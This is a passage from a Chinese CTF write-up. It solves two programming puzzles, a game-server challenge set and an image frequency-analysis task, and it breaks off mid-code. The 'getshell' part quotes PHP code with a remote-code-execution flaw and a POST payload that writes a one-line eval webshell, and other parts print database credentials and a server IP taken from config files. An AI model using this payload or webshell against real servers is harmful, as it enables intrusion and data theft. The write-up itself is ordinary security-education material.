hex，表示当前这一行在该流量包的偏移。</p></li><li><p>两个空格之后，是该流量包的 hex dump 内容，每行 16 个 hex dump。</p></li><li><p>hex dump 之后，是该流量包内容的字符显示，对于可见字符(32 ~ 126)，显示字符本身，对于不可见字符，显示一个 . 号</p></li><li><p>对于无法凑齐 16 个 hex 的行，其不足的内容用空格代替。确保每一行的总长度是相等的。</p></li><li><p>根据下面的样例，仔细处理空格的数量。</p></li></ol></blockquote><p>按照输出要求格式化解析即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"></span><br><span class="line">N = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    k, b = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    h = <span class="built_in">list</span>(b64decode(b.encode()))</span><br><span class="line">    <span class="keyword">if</span> k == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ceil(<span class="built_in">len</span>(h)/<span class="number">16</span>)):</span><br><span class="line">            ind = <span class="built_in">hex</span>(i*<span class="number">16</span>)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            hh = h[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)]</span><br><span class="line">            hh1 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[:<span class="number">8</span>])))</span><br><span class="line">            hh2 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[<span class="number">8</span>:])))</span><br><span class="line">            ch1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            ch2 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;ind&#125;</span>  <span class="subst">&#123;hh1&#125;</span>  <span class="subst">&#123;hh2&#125;</span>   <span class="subst">&#123;ch1&#125;</span> <span class="subst">&#123;ch2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ceil(<span class="built_in">len</span>(h)/<span class="number">16</span>)):</span><br><span class="line">            ind = <span class="built_in">hex</span>(i*<span class="number">16</span>)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            hh = h[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)]</span><br><span class="line">            hh1 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[:<span class="number">8</span>])))</span><br><span class="line">            hh2 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[<span class="number">8</span>:])))</span><br><span class="line">            ch1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            ch2 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;        <span class="subst">&#123;ind&#125;</span>  <span class="subst">&#123;hh1&#125;</span>  <span class="subst">&#123;hh2&#125;</span>   <span class="subst">&#123;ch1&#125;</span> <span class="subst">&#123;ch2&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Fight-Clones"><a href="#Fight-Clones" class="headerlink" title="Fight Clones"></a>Fight Clones</h3><blockquote><p><strong>Description</strong></p><p>Neo 被 Smith 的分身们包围了！他需要击败他们！</p><p>每一个 Smith 都有自己的攻击值和生命值。在受到攻击之前，他们都可以持续攻击 Neo。</p><p>Neo 也有自己的攻击值和生命值，虽然比 Smith 高得多，但是 Neo 一次也只能攻击一个 Smith（是的他没有 AOE）。</p><p>Neo 需要找到一个最优的攻击策略，以保证自己生命值被减为零之前击倒所有 Smith。</p><p>Neo 的生命值是确定的，Oracle 之前告诉过他。但是他需要知道自己的攻击值是否能够确保打赢 Smith 们。</p><p>你能帮 Neo 计算出他所需要的最小攻击值么？</p><p><strong>Input</strong></p><p>第一行输入两个整数 $N H$ ($1 \le N \le 1000,1 \le H \le 1000000$)，表示总共有 $N$ 个 Smith，以及 Neo 的生命值为 $H$。</p><p>接下来 $N$ 行，表示 $N$ 个 Smith 的属性，每行格式为 $AH$，其中</p><p>- $A$ 为该 Smith 的攻击值 ($1 \le A \le 1000$)。</p><p>- $H$ 为该 Smith 的生命值 ($1 \le H \le 1000$)。</p><p><strong>Output</strong></p><p>输出一个整数，表示所需要的最小攻击值。如果无法保证击败 Smith 们则输出 <code>-1</code>。</p><p><strong>Hint</strong></p><p>Neo 和 Smith 们是 <code>实时战斗制</code>（非回合制），即 Neo 和 Smith 们可以<strong>同时</strong>攻击对方，只不过 Neo 一个时间只能打一个 Smith，</p><p>而 Smith 们可以群殴 Neo（不用考虑碰撞体积的问题）。</p><p>可以假定 Neo 和 Smith 们每单位时间只能<strong>击打对手一次</strong>。例如，某个 Smith 生命值为 20，而 Neo 攻击值为 15，那 Neo 也需要消耗</p><p>两个单位的时间来消灭该 Smith，同时意味着有 10 单位的攻击力被浪费掉了。</p><p>Smith 一旦受到 Neo 的攻击，就会停止击打 Neo。例如 Neo 和 Smith 某一个时刻同时攻击对方，Neo 则不会受到伤害。</p></blockquote><p>贪心算法+二分查找最小攻击值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> cmp_to_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_sort</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> y[<span class="number">0</span>] * x[<span class="number">2</span>] - x[<span class="number">0</span>] * y[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_min_attack</span>(<span class="params">neo_life, smiths</span>):</span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    r = <span class="number">1000</span></span><br><span class="line">    ans = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">        m = (l + r) // <span class="number">2</span></span><br><span class="line">        s = [(k[<span class="number">0</span>], k[<span class="number">1</span>], (k[<span class="number">1</span>]+m-<span class="number">1</span>)//m) <span class="keyword">for</span> k <span class="keyword">in</span> smiths]</span><br><span class="line">        s.sort(key=cmp_to_key(custom_sort))</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            res += t*s[i][<span class="number">0</span>]</span><br><span class="line">            t += s[i][<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> res &lt; neo_life:</span><br><span class="line">            ans = m</span><br><span class="line">            r = m - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">N, H = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split()))</span><br><span class="line">smiths = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    smiths.append(<span class="built_in">tuple</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split())))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(find_min_attack(H, smiths))</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="gaming"><a href="#gaming" class="headerlink" title="gaming"></a>gaming</h2><h3 id="游戏来咯"><a href="#游戏来咯" class="headerlink" title="游戏来咯"></a>游戏来咯</h3><p>登录游戏就在公告栏看到flag：<code>flag&#123;churusanguo&#125;</code>。</p><p>​    </p><h3 id="攻城拔寨"><a href="#攻城拔寨" class="headerlink" title="攻城拔寨"></a>攻城拔寨</h3><p>达到一定等级后游戏内会收到邮件，按 <strong>getshell</strong> 一题拿到权限后，找到 <code>D:/APMServ5.2.6/www/htdocs/server/config/db.php</code>，得到mysql数据库账号密码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_persistent&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_RDBMS&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Username&#x27;</span>, <span class="string">&#x27;sgphp1g2ame&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Password&#x27;</span>, <span class="string">&#x27;@Qwer123456&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Server&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Port&#x27;</span>, <span class="string">&#x27;3306&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Database&#x27;</span>, <span class="string">&#x27;bloodwar&#x27;</span>);</span><br></pre></td></tr></table></figure><p>在蚁剑用mysql连接，账号 <code>sgphp1g2ame</code>，密码 <code>@Qwer123456</code>，在表 <code>sys_mail_sys_content</code> 中找到邮件内容：<code>恭喜恭喜, flag2 flag&#123;jiaguanjinjueN&#125;</code>。</p><p>​    </p><h3 id="特殊玩家"><a href="#特殊玩家" class="headerlink" title="特殊玩家"></a>特殊玩家</h3><p>有玩家的名字是flag，按 <strong>getshell</strong> 一题拿到权限后，源码自带修改器，打开前修改配置文件 <code>config.ini</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[config]</span><br><span class="line">IP=120.55.42.64</span><br><span class="line">数据库=bloodwar</span><br><span class="line">账号=sgphp1g2ame</span><br><span class="line">密码=@Qwer123456</span><br><span class="line">端口=3306</span><br><span class="line">路径=D:\APMServ5.2.6\www\htdocs\images\armor</span><br><span class="line">聊天端口=5308</span><br><span class="line">登录信息=</span><br></pre></td></tr></table></figure><p>打开修改器，在用户基本信息发现用户名 <code>flag&#123;mysqlwo&#125;</code>。</p><p>​    </p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>在源码 <code>APMServ5.2.6/www/htdocs/server/game/BattleNetGateway.php</code> 中发现容易控制传值的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;interface.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;utils.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;BattleFunc.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;HeroFunc.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;BattleNetServices.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;BATTLE_NET_KEY&quot;</span>,<span class="string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>)) &#123;<span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(PHP_OS, <span class="number">0</span>, <span class="number">3</span>) == <span class="string">&#x27;WIN&#x27;</span>) <span class="title function_ invoke__">define</span>(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="string">&#x27;;&#x27;</span>); <span class="keyword">else</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="string">&#x27;:&#x27;</span>);&#125;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;include_path&#x27;</span>,<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;include_path&#x27;</span>).PATH_SEPARATOR.<span class="title function_ invoke__">realpath</span>(<span class="string">&quot;../&quot;</span>)); </span><br><span class="line"></span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_POST</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$param</span>))<span class="variable">$param</span>=<span class="variable">$_GET</span>;</span><br><span class="line"><span class="variable">$from_uid</span>=<span class="variable">$param</span>[<span class="string">&quot;from_uid&quot;</span>];</span><br><span class="line"><span class="variable">$sign</span>=<span class="variable">$param</span>[<span class="string">&quot;sign&quot;</span>];</span><br><span class="line"><span class="variable">$commandFunc</span>=<span class="variable">$param</span>[<span class="string">&quot;commandFunc&quot;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$param</span>[<span class="string">&quot;content&quot;</span>]);</span><br><span class="line"><span class="variable">$content_encoding</span>=<span class="variable">$param</span>[<span class="string">&quot;content-encoding&quot;</span>];</span><br><span class="line"><span class="comment">//$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$sign</span>!=<span class="title function_ invoke__">md5</span>(<span class="variable">$from_uid</span>.<span class="variable">$commandFunc</span>.<span class="variable">$content</span>.BATTLE_NET_KEY))  <span class="comment">//sign为传入值与key连接字符串的md5值</span></span><br><span class="line"><span class="variable">$ret</span>[]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$content_encoding</span>==<span class="string">&quot;csv&quot;</span>)&#123;</span><br><span class="line"><span class="variable">$inputParams</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$content</span>);  <span class="comment">//按|分割content传入内容</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$inputParams</span>)==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$inputParams</span>=<span class="variable">$inputParams</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[]=<span class="variable">$commandFunc</span>(<span class="variable">$from_uid</span>,<span class="variable">$inputParams</span>); <span class="comment">//RCE漏洞</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$inputParams</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$content</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$inputParams</span>)&amp;&amp;<span class="title function_ invoke__">count</span>(<span class="variable">$inputParams</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">     <span class="variable">$inputParams</span>=<span class="title function_ invoke__">array_shift</span>(<span class="variable">$inputParams</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[]=<span class="variable">$commandFunc</span>(<span class="variable">$from_uid</span>,<span class="variable">$inputParams</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ret</span>[] = <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$content_encoding</span>==<span class="string">&quot;csv&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$ret</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此处可以RCE，分析代码逻辑，利用 <code>file_put_contents</code> 写入一句话木马：</p><p>POST: <code>from_uid=xx.php&amp;commandFunc=file_put_contents&amp;content=&lt;%3fphp%20%40eval($_POST[xxx])%3b&amp;content-encoding=csv&amp;sign=734c00692057aaf9f6c763f405cbec6b</code></p><p>蚁剑连接，在D:目录下找到 <code>flag.txt</code>，flag：<code>flag&#123;breakItAndOutIt&#125;</code>。</p><p>​    </p><h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><h3 id="文字频率分析"><a href="#文字频率分析" class="headerlink" title="文字频率分析"></a>文字频率分析</h3><p>非预期解法，将1000×1000图片分割为400张50×50的图片：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;word.png&#x27;</span>)</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        box = (<span class="number">50</span>*i,<span class="number">50</span>*j,<span class="number">50</span>*(i+<span class="number">1</span>),<span class="number">50</span>*(j+<span class="number">1</span>))</span><br><span class="line">        region = im.crop(box)</span><br><span class="line">        region.save(<span class="string">f&#x27;img/<span class="subst">&#123;c&#125;</span>.png&#x27;</span>)</span><br><span class="line">        c += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>测试发现相同字母的图片，其文件md5值相同，利用此规律统计字频，先操作一次找出26个字母对应文件的md5值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">sample = [<span class="number">7</span>,<span class="number">38</span>,<span class="number">28</span>,<span class="number">0</span>,<span class="number">73</span>,<span class="number">13</span>,<span class="number">42</span>,<span class="number">18</span>,<span class="number">36</span>,<span class="number">102</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">19</span>,</span><br><span class="line">    <span class="number">9</span>,<span class="number">58</span>,<span class="number">20</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">30</span>,<span class="number">50</span>,<span class="number">24</span>,<span class="number">11</span>,<span class="number">22</span>,<span class="number">8</span>,<span class="number">66</span>]</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">    path = <span class="string">fr&#x27;C:\Users\admin\Desktop\img\&#123;i&#125;.png&#x27;</span></span><br><span class="line">    m.append(md5(<span class="built_in">open</span>(path,<span class="string">&#x27;rb&#x27;</span>).read()).hexdigest())</span><br><span class="line"></span><br><span class="line">res = Counter(m)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line"></span><br><span class="line">alp_md5 = [m[sample[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"><span class="built_in">print</span>(alp_md5)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到md5对应list</span></span><br><span class="line"><span class="comment"># [&#x27;d108ad1582e37a825d092131a55babcc&#x27;, &#x27;9901603c7d2a5dde25723c9e569428da&#x27;, &#x27;5e47df30ddf5e623c9bbcd4fde58ec88&#x27;, &#x27;5bf0c7d972b37455dc32777ffdad86b9&#x27;, &#x27;33ff92480ee08585d901ffd0a47de021&#x27;, &#x27;3d3f026d8fc719c35a917d98d9b7474b&#x27;, &#x27;c07bd9475b8e9d65334e2f24f19794b3&#x27;, &#x27;4497c04cea4897727d88f7945bc86d77&#x27;, &#x27;047fd19a9a30301444e11394ee99d8be&#x27;, &#x27;802d7d3a2c02a1b6ba5f0860b70b54df&#x27;, &#x27;52d9844a5ed4eee07af4f48f880e3d5b&#x27;, &#x27;109d33cf832c83ebebca8c4f165862a9&#x27;, &#x27;f5252d81a8afc71cf5dd29270a398beb&#x27;, &#x27;121808a4d3f160f235f27cb77355d525&#x27;, &#x27;b15356da578f67bac5a3d777913ce97d&#x27;, &#x27;a174639d2070109e85ffb53657d5c9d5&#x27;, &#x27;e30a3ca0d2f0326a10175e8d6ed8a178&#x27;, &#x27;a267e80b28a9dae7e2c5d70198e808d7&#x27;, &#x27;e1e4b54464f7ae41ba2c71a9244d7347&#x27;, &#x27;ccf09a4c80cc7e4b3134ea53f423ec38&#x27;, &#x27;5b5480bc64f225e422ed8f084e629ff8&#x27;, &#x27;f17c5f58bf983a684cc8d7d4b3c1ae0b&#x27;, &#x27;287d3dac4e058281282e0eee00d9ddd4&#x27;, &#x27;a782a16d1fca70e6217e45dd3fe8ae6e&#x27;, &#x27;18cad01f22ca7c4bc9a7536474d17273&#x27;, &#x27;a4e1c4687c9c785271fc24f79aa2e0f0&#x27;]</span></span><br></pre></td></tr></table></figure><p>再综合起来解题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span 